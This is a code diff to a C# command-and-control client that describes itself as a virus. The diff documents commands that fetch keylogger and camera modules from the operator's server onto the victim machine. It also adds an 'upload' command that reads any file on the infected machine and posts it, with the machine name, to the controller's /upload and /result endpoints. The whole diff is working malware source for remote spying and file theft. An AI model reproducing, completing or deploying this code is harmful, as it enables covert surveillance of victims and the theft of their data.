@@ -1,5 +1,6 @@
 ﻿using System.Diagnostics;
 using System.Management;
+using System.Net.Http.Headers;
 
 namespace C2
 {
@@ -78,10 +79,24 @@ namespace C2
                     break;
 
                 case "download":
+                    /*
+                        A download command looks like this:
+                            download -k -r file_location 
+                            (This means that we want to reset the keylogger's current location held by the virus, this command won't upload the file)
+                            
+                            download -k file_location 
+                            (This command will upload a file and it will mark the location as the keylogger location)
+                            
+                            download file_location 
+                            (This command only uploads a file)
+                            
+                            Same functionality for -c (insead of -k) flag which indicates that we are working with the camera module.
+                     */
+
                     int skipped = 1;
                     string moduleFlag = args.Skip(skipped).First();
                     string resetFlag = args.Skip(skipped + 1).First();
-                    string status = string.Empty;
+                    string downloadStatus = string.Empty;
 
                     if (moduleFlag[0] == '-')
                     {
@@ -106,14 +121,14 @@ namespace C2
                     if (moduleFlag == "-k")
                     {
                         keyloggerPath = fullPath;
-                        status = $"Keylogger uploaded at: {keyloggerPath}";
-                        Console.WriteLine(status);
+                        downloadStatus = $"Keylogger uploading at: {keyloggerPath}";
+                        Console.WriteLine(downloadStatus);
                     }
                     else if (moduleFlag == "-c")
                     {
                         cameraPath = fullPath;
-                        status = $"Camera uploaded at: {cameraPath}";
-                        Console.WriteLine(status);
+                        downloadStatus = $"Camera uploading at: {cameraPath}";
+                        Console.WriteLine(downloadStatus);
                     }
 
 
@@ -137,36 +152,83 @@ namespace C2
                                         if (fileStream.CanWrite)
                                         {
                                             await response.Content.CopyToAsync(fileStream);
-                                            status = "File uploaded successfully! Path: " + fullPath;
+                                            downloadStatus = "File uploaded successfully! Path: " + fullPath;
                                         }
                                         else
                                         {
-                                            status = $"Failed to download file: Cannot write to location.";
+                                            downloadStatus = $"Failed to download file: Cannot write to location.";
                                         }
                                 
                                     }
                                 }
                                 catch (Exception ex)
                                 {
-                                    status = $"Failed to download filed: {ex.Message}";
+                                    downloadStatus = $"Failed to download filed: {ex.Message}";
                                 }
 
                             }
                             else
                             {
                                 // Display the status code and reason phrase
-                                status = $"Failed to download file: {response.StatusCode} {response.ReasonPhrase}";
+                                downloadStatus = $"Failed to download file: {response.StatusCode} {response.ReasonPhrase}";
                                 Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
                             }
                         }
                     }
 
-                    KeyValuePair<string, string> fileDownloadResult = new KeyValuePair<string, string>("result", status);
+                    KeyValuePair<string, string> fileDownloadResult = new KeyValuePair<string, string>("result", downloadStatus);
                     HttpResponseMessage r = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileDownloadResult, machineNameFormData })).Result;
                     await Console.Out.WriteLineAsync(r.Content.ToString());
 
                     break;
 
+                case "upload":
+                    string filePath = args[1].Trim('\"');
+                    string uploadStatus = string.Empty;
+
+                    if (File.Exists(filePath))
+                    {
+                        try
+                        {
+                            using (var content = new MultipartFormDataContent())
+                            using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                            {
+                                var fileContent = new StreamContent(fileStream);
+                                fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("multipart/form-data");
+                                content.Add(fileContent, "file", Path.GetFileName(filePath));
+
+                                var response = await server.PostAsync(url + "/upload", content);
+
+                                if (response.IsSuccessStatusCode)
+                                {
+                                    uploadStatus = $"File uploaded successfully on the server!";
+                                    Console.WriteLine(uploadStatus);
+                                }
+                                else
+                                {
+                                    uploadStatus = $"Failed to upload the file {filePath}!";
+                                    Console.WriteLine(uploadStatus);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            uploadStatus = $"An error occurred: {ex.Message}";
+                            Console.WriteLine(uploadStatus);
+                        }
+                    }
+                    else
+                    {
+                        uploadStatus = $"File not found! {filePath}";
+                        Console.WriteLine(uploadStatus);
+                    }
+
+                    KeyValuePair<string, string> fileUploadResult = new KeyValuePair<string, string>("result", uploadStatus);
+                    HttpResponseMessage resp = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileUploadResult, machineNameFormData })).Result;
+                    await Console.Out.WriteLineAsync(resp.Content.ToString());
+                    
+                    break;
+                    
                 case "log":
                     string message = string.Empty;
 
